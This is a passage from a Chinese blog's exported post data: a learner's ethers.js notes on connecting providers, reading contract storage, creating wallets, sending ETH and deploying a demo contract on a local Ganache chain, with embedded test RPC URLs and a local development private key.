&#123; &quot;inputs&quot;: [ &#123; &quot;internalType&quot;: &quot;address&quot;, &quot;name&quot;: &quot;_address&quot;, &quot;type&quot;: &quot;address&quot; &#125; ], &quot;name&quot;: &quot;getHashByAddress&quot;, &quot;outputs&quot;: [ &#123; &quot;internalType&quot;: &quot;bytes32&quot;, &quot;name&quot;: &quot;&quot;, &quot;type&quot;: &quot;bytes32&quot; &#125; ], &quot;stateMutability&quot;: &quot;pure&quot;, &quot;type&quot;: &quot;function&quot; &#125;, &#123; &quot;inputs&quot;: [ &#123; &quot;internalType&quot;: &quot;string&quot;, &quot;name&quot;: &quot;_str&quot;, &quot;type&quot;: &quot;string&quot; &#125; ], &quot;name&quot;: &quot;getHashByString1&quot;, &quot;outputs&quot;: [ &#123; &quot;internalType&quot;: &quot;bytes32&quot;, &quot;name&quot;: &quot;&quot;, &quot;type&quot;: &quot;bytes32&quot; &#125; ], &quot;stateMutability&quot;: &quot;pure&quot;, &quot;type&quot;: &quot;function&quot; &#125;, &#123; &quot;inputs&quot;: [ &#123; &quot;internalType&quot;: &quot;string&quot;, &quot;name&quot;: &quot;_str&quot;, &quot;type&quot;: &quot;string&quot; &#125; ], &quot;name&quot;: &quot;getHashByString2&quot;, &quot;outputs&quot;: [ &#123; &quot;internalType&quot;: &quot;bytes32&quot;, &quot;name&quot;: &quot;&quot;, &quot;type&quot;: &quot;bytes32&quot; &#125; ], &quot;stateMutability&quot;: &quot;pure&quot;, &quot;type&quot;: &quot;function&quot; &#125;, &#123; &quot;inputs&quot;: [ &#123; &quot;internalType&quot;: &quot;string&quot;, &quot;name&quot;: &quot;_str&quot;, &quot;type&quot;: &quot;string&quot; &#125; ], &quot;name&quot;: &quot;getHashByString3&quot;, &quot;outputs&quot;: [ &#123; &quot;internalType&quot;: &quot;bytes32&quot;, &quot;name&quot;: &quot;&quot;, &quot;type&quot;: &quot;bytes32&quot; &#125; ], &quot;stateMutability&quot;: &quot;pure&quot;, &quot;type&quot;: &quot;function&quot; &#125;, &#123; &quot;inputs&quot;: [ &#123; &quot;internalType&quot;: &quot;string&quot;, &quot;name&quot;: &quot;_str&quot;, &quot;type&quot;: &quot;string&quot; &#125; ], &quot;name&quot;: &quot;getHashByString4&quot;, &quot;outputs&quot;: [ &#123; &quot;internalType&quot;: &quot;bytes32&quot;, &quot;name&quot;: &quot;&quot;, &quot;type&quot;: &quot;bytes32&quot; &#125; ], &quot;stateMutability&quot;: &quot;pure&quot;, &quot;type&quot;: &quot;function&quot; &#125;] remix上的结果： vscode的结果：","categories":[{"name":"Solidity","slug":"Solidity","permalink":"https://biyouqiuqiu.com/categories/Solidity/"},{"name":"Basic_Knowledge","slug":"Solidity/Basic-Knowledge","permalink":"https://biyouqiuqiu.com/categories/Solidity/Basic-Knowledge/"},{"name":"Utils","slug":"Solidity/Utils","permalink":"https://biyouqiuqiu.com/categories/Solidity/Utils/"}],"tags":[{"name":"abi.encode","slug":"abi-encode","permalink":"https://biyouqiuqiu.com/tags/abi-encode/"},{"name":"abi.encodePacked","slug":"abi-encodePacked","permalink":"https://biyouqiuqiu.com/tags/abi-encodePacked/"},{"name":"solidityKeccak256","slug":"solidityKeccak256","permalink":"https://biyouqiuqiu.com/tags/solidityKeccak256/"},{"name":"abiCoder.encode","slug":"abiCoder-encode","permalink":"https://biyouqiuqiu.com/tags/abiCoder-encode/"},{"name":"hash","slug":"hash","permalink":"https://biyouqiuqiu.com/tags/hash/"}]},{"title":"ethersjs_self","slug":"Ethersjs/Basic_Knowledge/ethersjs_self","date":"2023-05-12T02:47:10.000Z","updated":"2023-05-12T02:47:10.000Z","comments":true,"path":"2023/05/12/Ethersjs/Basic_Knowledge/ethersjs_self/","link":"","permalink":"https://biyouqiuqiu.com/2023/05/12/Ethersjs/Basic_Knowledge/ethersjs_self/","excerpt":"","text":"ethers.js_day011. ethers.js的安装 参考文档 在终端执行命令： 1npm install --save ethers 出现的问题: a. 按照 B站教程来的话，需要修改package.js中的配置，如： 123456&#123; &quot;type&quot;: &quot;module&quot;, &quot;dependencies&quot;: &#123; &quot;ethers&quot;: &quot;^5.6.9&quot; &#125;&#125; 在这里：加入了 &#39;&#39;type&quot;: &quot;module&quot;之后，require()这种引包的方式就不能使用了，网上搜了一下说是 ES6模块（没系统学过JavaScript，不是很懂，只是记录一下，避免继续犯错），得需要使用 import的方式导入 ethers包 1const &#123; ethers &#125; = require(&quot;ethers&quot;); 1import &#123; ethers &#125; from &quot;ethers&quot;; b. B站视频中在vscode上安装的ethers包的命令为： 1npm install ethers@5.6.9 这行代码会让代码无法运行，报错如下： 2. 编写 Hello Vitalik2.1 编译器： 在线编译器 —– playcode 本地编译器 —– VSCode 2.2 第一段代码 示例代码： 1234567import &#123; ethers &#125; from &quot;ethers&quot;;const provider = ethers.getDefaultProvider();const main = async () =&gt; &#123; const balance = await provider.getBalance(`vitalik.eth`); console.log(`ETH Balance of vitalik: $&#123;ethers.utils.formatEther(balance)&#125; ETH`);&#125;main() 解读代码 1234const main = async () =&gt; &#123; const balance = await provider.getBalance(`vitalik.eth`); console.log(`ETH Balance of vitalik: $&#123;ethers.utils.formatEther(balance)&#125; ETH`);&#125; 代码的意思： 这是一段使用 JavaScript 编写的代码，使用了 ethers.js 库与以太坊节点进行交互。 这段代码定义了一个异步函数 main()，在函数中： 使用 provider.getBalance() 函数获取 vitalik.eth 地址上的以太币余额，并将结果存储在 balance 变量中。这里的 provider 是一个 ethers.js 库中提供的以太坊节点对象，它用于与以太坊网络进行通信。 使用 ethers.utils.formatEther() 函数将以太币余额从 wei 单位转换为以太币单位，并将结果打印到控制台中。 因为 getBalance() 函数是异步函数，它会从以太坊网络中读取数据，因此需要使用 await 关键字等待它完成读取操作。在等待 getBalance() 函数完成后，balance 变量将包含返回的余额值，可以对其进行处理并打印到控制台中。 ethers.js_day023. Provider 提供器3.1 运行如下代码报错：12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758// 导入ethers包import &#123; ethers &#125; from &quot;ethers&quot;;// playcode免费版不能安装ethers，用这条命令，需要从网络上import包（把上面这行注释掉）// import &#123; ethers &#125; from &quot;https://cdn-cors.ethers.io/lib/ethers-5.6.9.esm.min.js&quot;;// 利用Alchemy的rpc节点连接以太坊网络// 准备 alchemy API 可以参考https://github.com/AmazingAng/WTFSolidity/blob/main/Topics/Tools/TOOL04_Alchemy/readme.md const ALCHEMY_MAINNET_URL = &#x27;https://eth-mainnet.g.alchemy.com/v2/oKmOQKbneVkxgHZfibs-iFhIlIAl6HDN&#x27;;const ALCHEMY_GOERLI_URL = &#x27;https://eth-goerli.alchemyapi.io/v2/GlaeWuylnNM3uuOo-SAwJxuwTdqHaY5l&#x27;;// 连接以太坊主网const providerETH = new ethers.JsonRpcProvider(ALCHEMY_MAINNET_URL)// 连接Goerli测试网const providerGoerli = new ethers.JsonRpcProvider(ALCHEMY_GOERLI_URL)const main = async () =&gt; &#123; // 利用provider读取链上信息 // 1. 查询vitalik在主网和Goerli测试网的ETH余额 console.log(&quot;1. 查询vitalik在主网和Goerli测试网的ETH余额&quot;); const balance = await providerETH.getBalance(`vitalik.eth`); const balanceGoerli = await providerGoerli.getBalance(`vitalik.eth`); // 将余额输出在console（主网） console.log(`ETH Balance of vitalik: $&#123;ethers.formatEther(balance)&#125; ETH`); // 输出Goerli测试网ETH余额 console.log(`Goerli ETH Balance of vitalik: $&#123;ethers.formatEther(balanceGoerli)&#125; ETH`); // 2. 查询provider连接到了哪条链 console.log(&quot;\\n2. 查询provider连接到了哪条链&quot;) const network = await providerETH.getNetwork(); console.log(network.toJSON()); // 3. 查询区块高度 console.log(&quot;\\n3. 查询区块高度&quot;) const blockNumber = await providerETH.getBlockNumber(); console.log(blockNumber); // 4. 查询 vitalik 钱包历史交易次数 console.log(&quot;\\n4. 查询 vitalik 钱包历史交易次数&quot;) const txCount = await providerETH.getTransactionCount(&quot;vitalik.eth&quot;); console.log(txCount); // 5. 查询当前建议的gas设置 console.log(&quot;\\n5. 查询当前建议的gas设置&quot;) const feeData = await providerETH.getFeeData(); console.log(feeData); // 6. 查询区块信息 console.log(&quot;\\n6. 查询区块信息&quot;) const block = await providerETH.getBlock(0); console.log(block); // 7. 给定合约地址查询合约bytecode，例子用的WETH地址 console.log(&quot;\\n7. 给定合约地址查询合约bytecode，例子用的WETH地址&quot;) const code = await providerETH.getCode(&quot;0xc778417e063141139fce010982780140aa0cd5ab&quot;); console.log(code);&#125;main() 报错结果如下： 报错原因是说 JsonRpcProvider 不是一个构造器，到官方文档上查看，JsonRpcProvider的用法是： 1234// 连接以太坊主网const providerETH = new ethers.providers.JsonRpcProvider(ALCHEMY_MAINNET_URL)// 连接Goerli测试网const providerGoerli = new ethers.providers.JsonRpcProvider(ALCHEMY_GOERLI_URL) RPC的连接 3.2 与本地的ganache获取连接 代码： 123456789import &#123; ethers &#125; from &quot;ethers&quot;;const provider = ethers.getDefaultProvider(&quot;HTTP://127.0.0.1:8545&quot;);// 我设置的端口号为8545const address = &#x27;&#x27;; // 替换为需要查询余额的账户地址provider.getBalance(address).then((balance) =&gt; &#123; console.log(`Account balance: $&#123;ethers.utils.formatEther(balance)&#125; ETH`);&#125;).catch((err) =&gt; &#123; console.error(&#x27;Error:&#x27;, err);&#125;); ​ 3.3 与 metamask（小狐狸🦊钱包）建立连接 3.3.1 需要到 Alchemy 上获取RPC 的节点 12345678const provider = ethers.getDefaultProvider(&quot;&quot;); // 从Alchemy获取const address = &#x27;&#x27;; // 替换为需要查询余额的账户地址provider.getBalance(address).then((balance) =&gt; &#123; console.log(`Account balance: $&#123;ethers.utils.formatEther(balance)&#125; ETH`);&#125;).catch((err) =&gt; &#123; console.error(&#x27;Error:&#x27;, err);&#125;); 3.4 利用Provider读取链上数据tips：const provider = new ethers.providers.JsonRpcProvider(&quot;HTTP://127.0.0.1:8545&quot;); 这个的连接速度要比const provider = ethers.getDefaultProvider(&quot;HTTP://127.0.0.1:8545&quot;);的连接速度更快 3.5 获取指定地址的余额 – provider.getBalance(address) 代码： 12345&gt;provider.getBalance(address).then((balance) =&gt; &#123; console.log(`Account balance: $&#123;ethers.utils.formatEther(balance)&#125; ETH`);&gt;&#125;).catch((err) =&gt; &#123; console.error(&#x27;Error:&#x27;, err);&gt;&#125;); 解释： 这段代码是使用以太坊 JavaScript 库 Ethers.js 来查询指定以太坊地址的余额，并将其以以太币（ETH）的形式打印到控制台上。 具体来说，这段代码执行了以下步骤： 调用 provider.getBalance(address) 方法，其中 provider 是一个以太坊节点提供商，address 是要查询的以太坊地址。 getBalance() 方法返回一个 Promise，该 Promise 在查询完成后返回以太坊地址的余额。 当 Promise 被解析时，then() 方法中的回调函数会被执行。该回调函数使用 ethers.utils.formatEther() 方法将余额从 wei 转换为以太，并将结果打印到控制台上。 如果 Promise 被拒绝（即查询失败），则 catch() 方法中的回调函数会被执行，该回调函数将错误信息打印到控制台上 3.6 查询provider连接到那条链 – provider.getNetwork() 代码： 1const netWork = await provider.getNetwork(); 查询结果： 3.7 查询当前 gas price — provider.getGasPrice() tips:返回的数据格式为BigNumber，可以用BigNumber类的toNumber()或toString() 方法转换成数字或者字符串 代码： 12&gt;const gas_price = await provider.getGasPrice();&gt;console.log(gas_price.toString()); 运行结果： 3.8 查询区块信息 – provider.getBlock() 代码： 1const block = await provider.getBlock(2); 查询结果： 3.9 查询地址的合约bytecode — provider.getCode(address) 代码： 12const address = &quot;0x44f2A5d2CFf45111E5FdcBE600CfA62Ea0386E7f&quot;; //合约地址const code = await providerETH.getCode(address); 查询结果： 4.读取合约信息4.1 创建Contract变量4.1.1 只读Contract tips：参数分别是合约地址，合约的abi和provider变量（只读） 代码： 1const contract = new ethers.Contract(`address`,`abi`,`provider`) 4.1.2 可读写 Contract tips: 参数分别是合约地址，合约的abi和singer变量。Singer签名者是ethers中另一个类，用于签名交易。 代码： 1const contract = new ethers.Contract(`address`, `abi`, `signer`); 4.2 创建只读 Contract实例tips：创建Contract实例需要填入三个参数，分别是合约地址，合约abi和provider变量。 tips:ehters支持两种abi填法 方法一：直接输出合约的abi。也可以像之前web3中那样使用 fs包读取 .abi文件，我觉得这种可读性更强一些。 1234var fs = require(&quot;fs&quot;);var path = &quot;&quot;;//这里是你本地abi的文件地址var contractABI = JSON.parse(fs.readFileSync(path),toString()); 参考代码： 123456789101112131415// SPDX-License-Identifier: MITpragma solidity ^0.4.21;contract CallMeChallenge &#123; int public value = 5; bool public isComplete = false; function callme() public &#123; isComplete = true; &#125; function getValue() external view returns(int) &#123; return value; &#125;&#125; 12345678910111213141516171819202122232425262728293031323334import &#123; Contract, ethers &#125; from &quot;ethers&quot;; // ES6模块下引入ethers包// var fs = require(&quot;fs&quot;)import fs from &quot;fs&quot;; // ES6模块下引入fs包const provider = new ethers.providers.JsonRpcProvider(&quot;HTTP://127.0.0.1:8545&quot;);// 读取文件的abilet con_ABI = JSON.parse(fs.readFileSync(&quot;D:\\\\VSCode\\\\VSCode_Data\\\\ethersjsWorkspace\\\\LearningSelf\\\\abi\\\\CallMeChallenge.abi&quot;).toString())// 合约地址let con_Address = &quot;0xCfD32B1C6C1b2Fb425F3d6a86F8E2ebB363b5d96&quot;;// 创建合约let contract = new ethers.Contract(con_Address,con_ABI,provider);async function main() &#123; let slot0 = await provider.getStorageAt(con_Address,0); console.log(&quot;slot0 = &gt;&quot; + slot0); let slot1 = await provider.getStorageAt(con_Address,0); console.log(&quot;slot1 = &gt;&quot; + slot1);&#125; // 调用函数main()// 调用合约的只读函数let value = await contract.getValue();console.log(&quot;value =&gt; &quot; + value);let address = &quot;0xfDc84b042c01F01C7cC6eF08452BA156844c3A5C&quot;;provider.getBalance(address).then((balance)=&gt;&#123; console.log(`Account balance: $&#123;ethers.utils.formatEther(balance)&#125; ETH`);&#125;) 运行结果： 注: 在Solidity中，布尔类型(bool)的默认值是false。在你的智能合约中，存储槽(slot)的位置为0，存储的变量是布尔类型(isComplete)，因此默认值为false。 当你部署合约时，存储槽的初始值会被设置为false。如果在之后合约的执行过程中，调用了callme()函数，isComplete变量的值会被设置为true，存储槽的值也会相应地被更新为true。 在使用ethers查询存储槽的值时，如果存储槽的值为false，查询结果会显示为0x0。如果存储槽的值为true，查询结果会显示为0x1。 因此，如果你在查询智能合约的存储槽时得到的结果是0x0，这意味着存储槽的值为false，即isComplete变量还没有被设置为true。如果你想要获取存储槽的实际值，可以将查询结果转换为布尔类型，如下所示: 123const slot0 = await provider.getStorageAt(contractAddress, 0);const isComplete = ethers.utils.bigNumberify(slot0).toNumber() !== 0;console.log(`isComplete: $&#123;isComplete&#125;`); 这段代码将查询结果转换为BigNumber类型，并将其转换为数字类型。如果数字不为0，isComplete变量的值为true，否则为false。 方法二：由于abi可读性太差，ethers创新的引入了人类可读ABI。开发者可以通过function signature和event signature来写ABI。 参考代码： 123456789101112131415161718192021222324252627import &#123; Contract, ethers &#125; from &quot;ethers&quot;; // ES6模块下引入ethers包// var fs = require(&quot;fs&quot;)import fs from &quot;fs&quot;; // ES6模块下引入fs包const provider = new ethers.providers.JsonRpcProvider(&quot;HTTP://127.0.0.1:8545&quot;);// 读取文件的abilet con_ABI = JSON.parse(fs.readFileSync(&quot;D:\\\\VSCode\\\\VSCode_Data\\\\ethersjsWorkspace\\\\LearningSelf\\\\abi\\\\CallMeChallenge.abi&quot;).toString())// 合约地址let con_Address = &quot;0xCfD32B1C6C1b2Fb425F3d6a86F8E2ebB363b5d96&quot;;// 创建合约let contract = new ethers.Contract(con_Address,con_ABI,provider);let abi = [ &quot;function callme() public&quot;, &quot;function getValue() external view returns(int)&quot;,]let contract1 = new ethers.Contract(con_Address,abi,provider);async function demo1()&#123; // 调用合约的只读函数 let value = await contract1.getValue(); console.log(&quot;demo1&#x27;s value =&gt; &quot; + value);&#125;demo1() 运行结果： 4.3 更多的读取合约信息可到 官方文档 查看5.发送ETH5.1 Signer签名类在ethers中，Signer签名者类是以太坊账户的抽象类，可用于对消息和交易进行签名，并将签名的交易发送到以太坊网络，并更改区块链状态。Signer类是抽象类，不能直接实例化，我们需要使用它的子类：Wallet钱包类。 5.2 Wallet钱包类Wallet类继承了Signe类，并且开发者可以像包含私钥的外部拥有者账户（EOA）一样，用它对交易和消息进行签名。 5.2.1方法一：创建随机的wallet对象我们可以使用 ethers.Wallet.createRandom()函数创建带有随机私钥的Wallet对象。对该私钥由加密安全的熵源生成，如果当前环境没有安全的熵源，则会引发错误。 tips：在密码学中，熵（entropy）是指随机性的度量。在智能合约中，熵源（entropy source）是指用于生成随机数或随机种子的源头。 在智能合约中，为了确保随机数的安全性和不可预测性，需要使用熵源来生成随机数或随机种子。通常情况下，熵源可以是外部的数据源，例如区块哈希或者时间戳等，也可以是合约内部的数据源，例如合约的存储槽或者合约的执行结果等。 需要注意的是，熵源的质量和安全性对于密码学应用非常重要。如果熵源不够随机或者不够安全，可能会导致随机数的可预测性，从而破坏密码学应用的安全性。因此，在使用熵源生成随机数或随机种子时，需要选择合适的熵源，并对其进行充分的测试和验证，以确保其安全性和不可预测性。 12// 创建随机的wallet对象const wallet1 = new ethers.Wallet.createRandom() 5.2.2方法二：用私钥创建wallet对象我们已知私钥的情况下，可以利用ethers.Wallet() 函数创建 Wallet对象。 从Ganache中获取privateKey 123// 利用私钥和provider创建wallet对象const privateKey = &#x27;&#x27; // 填入你的私钥const wallet2 = new ethers.Wallet(privateKey, provider) 5.2.3方法三：从助记词创建wallet对象我们已知助记词的情况下，可以利用 ethers.Wallet.fromMnemonic() 函数创建Wallet对象。 12// 从助记词创建wallet对象const wallet3 = new ethers.Wallet.fromMnemonic(mnemonic.phrase) 5.2.4 其他方法：通过JSON文件创建wallet对象通过ethers.Wallet.fromEncryptedJson解密一个JSON钱包文件创建钱包实例，JSON文件即keystore文件，通常来自Geth, Parity等钱包 5.3 发送ETH我们可以利用Wallet实例来发送ETH。首先，我们需要构造一个交易请求，在里面声明接收地址to和发送的ETH数额value。交易请求TransactionRequest类型可以包含发送方 from，nonce值 nounce，请求数据data等信息。 12345// 创建交易请求，参数：to为接收地址，value为ETH数额const tx = &#123; to: address1, value: ethers.utils.parseEther(&quot;0.001&quot;)&#125; 然后，我们就可以利用Wallet类的sendTransaction来发送交易，等待交易上链，并获得交易的数据。 1234//发送交易，获得收据const receipt = await wallet2.sendTransaction(tx)await receipt.wait() // 等待链上确认交易console.log(receipt) // 打印交易详情 5.4 代码实例5.4.1创建Wallet实例三种方法的示例代码： 1234567891011121314151617181920212223242526272829303132333435363738import &#123; ethers &#125; from &quot;ethers&quot;;const netWork = &quot;HTTP://127.0.0.1:8545&quot;;const provider = new ethers.providers.JsonRpcProvider(netWork);// let balance = await provider.getBalance(&quot;0xfDc84b042c01F01C7cC6eF08452BA156844c3A5C&quot;);// console.log(`Account balance: $&#123;ethers.utils.formatEther(balance)&#125; ETH`);/** 方法一：创建随机私钥的Wallet对象。 这种方法创建的钱包是单机的，我们需要用connect(provider)函数，连接到以太坊节点。这种方法创建的钱包可以用mnemonic获取助记词 */const wallet1 = ethers.Wallet.createRandom();console.log(&quot;wallet1 =&gt;\\n&quot;,wallet1);const wallet1WithProvider = wallet1.connect(provider);const mnemonic = wallet1.mnemonic;console.log(&quot;助记词：\\n&quot; , mnemonic);/** * 方法二：利用私钥和provider实例创建Wallet对象 * 这种方法不能获取助记词 */const privateKey = &quot;0x9b139483dc6f6c8782fda2301e9b65a75b3d084d79e79e04c64683bebfa1741d&quot;;const wallet2 = new ethers.Wallet(privateKey, provider);console.log(&quot;wallet2 =&gt;\\n&quot;,wallet2);/** * 方法三：利用助记词创建Wallet对象 */// 从助记词创建wallet对象const wallet3 = ethers.Wallet.fromMnemonic(mnemonic.phrase);console.log(&quot;wallet3 =&gt; &quot;,wallet3); 运行结果： 5.4.2 获取钱包地址 代码： 123456789101112/** * 获取钱包地址 */const address1 = await wallet1.getAddress()const address2 = await wallet2.getAddress() const address3 = await wallet3.getAddress() // 获取地址console.log(`1. 获取钱包地址`);console.log(`钱包1地址: $&#123;address1&#125;`);console.log(`钱包2地址: $&#123;address2&#125;`);console.log(`钱包3地址: $&#123;address3&#125;`);console.log(`钱包1和钱包3的地址是否相同: $&#123;address1 === address3&#125;`); 运行结果： 5.4.3 获取助记词利用钱包对象的mnemonic成员获取助记词： 1console.log(`钱包1助记词: $&#123;wallet1.mnemonic.phrase&#125;`) 结果： 5.4.4 利用钱包对象的 privateKey 成员获取私钥：1console.log(`钱包2私钥: $&#123;wallet2.privateKey&#125;`) 运行结果： 到ganache上查看： 结果是相同的。 5.4.5 获取钱包在链上的交互次数利用 getTransactionCount()函数获取钱包在链上的交互次数 1234const txCount1 = await wallet1WithProvider.getTransactionCount()const txCount2 = await wallet2.getTransactionCount()console.log(`钱包1发送交易次数: $&#123;txCount1&#125;`)console.log(`钱包2发送交易次数: $&#123;txCount2&#125;`) 运行结果： 到ganache上查看： 5.4.6 发送ETH我们用wallet2给wallet1发送0.001 ETH，并打印交易前后的钱包余额。由于wallet1是新建的随机私钥钱包，因此交易前余额为0，而交易后余额为0.001 ETH。 1234567891011121314151617181920212223242526272829303132333435363738const wallet1 = ethers.Wallet.createRandom();const wallet1WithProvider = wallet1.connect(provider);const mnemonic = wallet1.mnemonic;const privateKey = &quot;0x9b139483dc6f6c8782fda2301e9b65a75b3d084d79e79e04c64683bebfa1741d&quot;;const wallet2 = new ethers.Wallet(privateKey, provider);/** * 获取钱包地址 */const address1 = await wallet1.getAddress()const address2 = await wallet2.getAddress() /** * 发送ETH */console.log(&quot; wallet2 给 wallet1 转账0.01ETH&quot;);//交易前余额console.log(`钱包1: $&#123;ethers.utils.formatEther(await wallet1WithProvider.getBalance())&#125; ETH`);console.log(`钱包2: $&#123;ethers.utils.formatEther(await wallet2.getBalance())&#125; ETH`);// 构建交易请求；to为接收地址，value为ETH数额const TX = &#123; to: address1, value: ethers.utils.parseEther(&quot;0.001&quot;)&#125;// 发送交易，获得收据const recepit = await wallet2.sendTransaction(TX);await recepit.wait();console.log(&quot;receipt =&gt; &quot;,recepit);console.log(&quot;发送后的账户余额&quot;);console.log(`钱包1: $&#123;ethers.utils.formatEther(await wallet1WithProvider.getBalance())&#125; ETH`);console.log(`钱包2: $&#123;ethers.utils.formatEther(await wallet2.getBalance())&#125; ETH`); 运行结果： ethers.js_day036. 合约交互6.1 创建可写Contract变量 声明可写的Contract变量的规则： 1const contract = new ethers.Contract(address, abi, signer) 解读：其中 address 是合约地址，abi是合约的abi接口，singer是wallet对象。声明可写contract需要提供signer，声明可读contract只需要provider 将可读合约转换为可写合约： 1const contract2 = contract.connect(signer) 6.2 合约交互 读合约信息不需要gas。写入合约需要接入合约信息，构建交易，并支付gas。该交易将由整个网络的每个节点以及矿工验证，并改变区块链状态。 合约交互的方法如下： 1234// 发送交易const tx = await contract.METHOD_NAME(args [, overrides])// 等待链上确认交易await tx.wait() 解读代码：其中METHOD_NAME为调用的函数名，args为函数参数，[, overrides]是可以选择传入的数据，包括： gasPrice：gas价格 gasLimit：gas上限 value：调用时传入的ether（单位是wei） nonce：nonce（随机数？） 注：此方法不能获取合约运行的返回值，如若需要获取合约运行你的返回值，要使用Solidity事件记录，然后利用交易收据去查询。 6.3 例子：与本地ganache合约交互 创建provider，wallet变量 123456789&gt;import &#123; ethers &#125; from &quot;ethers&quot;;&gt;// 获取本地的provider&gt;const provider = new ethers.providers.JsonRpcProvider(&quot;HTTP://127.0.0.1:8545&quot;);&gt;// 根据私钥创建 wallet对象&gt;const privateKey = &quot;0x9b139483dc6f6c8782fda2301e9b65a75b3d084d79e79e04c64683bebfa1741d&quot;;&gt;const wallet = new ethers.Wallet(privateKey, provider); 创建可写合约变量，在我自己 domo1.sol中调用4个函数 getSlot0():查找插槽0位置的值； getSlot1():查找插槽1位置的值； getSlot2():查找插槽2位置的值； depoist():转账； balanceOf():查询地址余额。 tips：这里我使用的是方法是传入remix上获取的abi 12345678910111213/** * 创建可写的合约变量 */ // 读取文件的abiconst ABI = JSON.parse(fs.readFileSync(&quot;LearningSelf\\\\day03\\\\demo1.abi&quot;).toString());// 在remix上部署的合约地址const contractAddress = &quot;0x5B1557A5AD3cfAC88F3624743BF67baB28723899&quot;;// 声明可写合约const constract = new ethers.Contract(contractAddress,ABI,wallet); 3.调用getSlot0、1、2()三个函数，查看其值 12345678910// let slot0 = await provider.getStorageAt(contractAddress,0);let slot0 = await constract.getSlot0();// console.log(slot0);console.log(`slot0&#x27;s value is =&gt; $&#123;slot0&#125;`);let slot1 = await constract.getSlot1();// console.log(slot1);console.log(`slot1&#x27;s value is =&gt; $&#123;slot1&#125;`);let slot2 = await constract.getSlot2();// console.log(slot2);console.log(`slot2&#x27;s value is =&gt; $&#123;slot2&#125;`) 运行结果： 4.查询账户的余额 123456// 需要查询余额的账户let test_address = &quot;0x753f06cD09C531Ef83b84C5147E812519BB65efd&quot;;let balance = await constract.balanceOf(test_address);console.log(`ETH balance is =&gt; $&#123;ethers.utils.formatEther(balance)&#125;`) 运行结果： 5.转账操作，打印交易详情和余额。 123456//转账let balance1 = await provider.getBalance(test_address);console.log(`转账前的余额为：=&gt; $&#123;ethers.utils.formatEther(balance1)&#125;`)constract.depoist(1, test_address);console.log(`转账后的余额为：=&gt; $&#123;ethers.utils.formatEther(balance1)&#125;`) 运行结果： 由于vscode显示数位的问题，使用在remix上查询显示的位数更多 注：对于非pure&#x2F;view函数的调用，会返回交易的信息。如果想知道函数执行过程中合约变量的变化，可以在合约中使用emit输出事件，并在返回的transaction信息中读取事件信息来获取对应的值 完整的代码： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253import &#123; ethers &#125; from &quot;ethers&quot;;import fs from &quot;fs&quot;;// 获取本地的providerconst provider = new ethers.providers.JsonRpcProvider(&quot;HTTP://127.0.0.1:8545&quot;);// 根据私钥创建 wallet对象const privateKey = &quot;0x9b139483dc6f6c8782fda2301e9b65a75b3d084d79e79e04c64683bebfa1741d&quot;;const wallet = new ethers.Wallet(privateKey, provider);/** * 创建可写的合约变量 */ // 读取文件的abiconst ABI = JSON.parse(fs.readFileSync(&quot;LearningSelf\\\\day03\\\\demo1.abi&quot;).toString());// 在remix上部署的合约地址const contractAddress = &quot;0xf8fe22cA93bD2416a106dFB62168C0D7eBF557FE&quot;;// 声明可写合约const constract = new ethers.Contract(contractAddress,ABI,wallet);/** * 调用合约的函数 */// let slot0 = await provider.getStorageAt(contractAddress,0);let slot0 = await constract.getSlot0();// console.log(slot0);console.log(`slot0&#x27;s value is =&gt; $&#123;slot0&#125;`);let slot1 = await constract.getSlot1();// console.log(slot1);console.log(`slot1&#x27;s value is =&gt; $&#123;slot1&#125;`);let slot2 = await constract.getSlot2();// console.log(slot2);console.log(`slot2&#x27;s value is =&gt; $&#123;slot2&#125;`);// 需要查询余额的账户let test_address = &quot;0x753f06cD09C531Ef83b84C5147E812519BB65efd&quot;;let balance = await constract.balanceOf(test_address);console.log(`ETH balance is =&gt; $&#123;ethers.utils.formatEther(balance)&#125;`)//转账let balance1 = await provider.getBalance(test_address);console.log(`转账前的余额为：=&gt; $&#123;ethers.utils.formatEther(balance1)&#125;`)constract.depoist(1, test_address);console.log(`转账后的余额为：=&gt; $&#123;ethers.utils.formatEther(balance1)&#125;`) 7.部署合约7.1 合约工厂 ethers.js 创造了合约工厂 ContractFactory类型，方便开发者部署合约。你可以利用合约abi，编译得到的字节码bytecode和签名者变量 singer 来创建合约工厂实例，为部署合约做准备。 1const contractFactory = new ethers.ContractFactory(abi, bytecode, signer); 注：如果合约的构造函数有参数，那么在abi中必须包含构造函数。 在创建好合约工厂之后，可以调用它的deploy函数，并传入合约构造函数的参数args来部署并得到合约实例： 1const contract = await contractFactory.deploy(args) 可以使用两种命令，等待合约部署在链上确认，然后再进行交互 12await contractERC20.deployed()//或者 await contract.deployTransaction.wait() 7.2 例子：部署我自己编写的demo1.sol合约 demo2.sol 代码： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract demo2 &#123; uint slot0; address slot1; string public slot2; // 初始化一些变量 constructor(uint _slot0, address _slot1, string memory _slot2) payable&#123; slot0 = _slot0; slot1 = _slot1; slot2 = _slot2; &#125; function setSlot0(uint num) public &#123; slot0 = num; &#125; function getSlot0() external view returns(uint)&#123; return slot0; &#125; function setSlot1(address _address) public &#123; slot1 = _address; &#125; function getSlot1() external view returns(address)&#123; return slot1; &#125; function setSlot2(string memory _str) public &#123; slot2 = _str; &#125; function getSlot2() external view returns(string memory)&#123; return slot2; &#125; function depoist(uint _amount, address payable _to) external &#123; uint balance = address(this).balance; require(balance &gt; _amount, &quot;You balance is less than your address(this).balance&quot;); _to.transfer(_amount); &#125; function balanceOf(address _address) external view returns(uint) &#123; return address(_address).balance; &#125;&#125; 创建provider和wallet变量 123456789import &#123; ethers &#125; from &quot;ethers&quot;;import fs from &quot;fs&quot;;// 获取本地的providerconst provider = new ethers.providers.JsonRpcProvider(&quot;HTTP://127.0.0.1:8545&quot;);// 根据私钥创建 wallet对象const privateKey = &quot;0x9b139483dc6f6c8782fda2301e9b65a75b3d084d79e79e04c64683bebfa1741d&quot;;const wallet = new ethers.Wallet(privateKey, provider); 准备demo1合约的字节码和ABI(这里我使用remix生成的ABI)。因为demo2的构造函数含有参数，因此我们需要把它包含再ABI中。合约的字节码可以从remix的编译面板中点击bytecode按钮拷贝下来(为了代码的可读性，将拷贝的字节码新建一个 .code文件存放，获取的时候 使用 fs来读取)，其中”object”字段对应的数据就是字节码。如果部署在链上的合约，你可以在etherscan的Contract页面的Contract Creation Code中找到。 123456789101112131415161718192021222324252627282930313233343536373839 // demo2人类可读abi /** const demo2ABI = [ &quot;constructor(uint 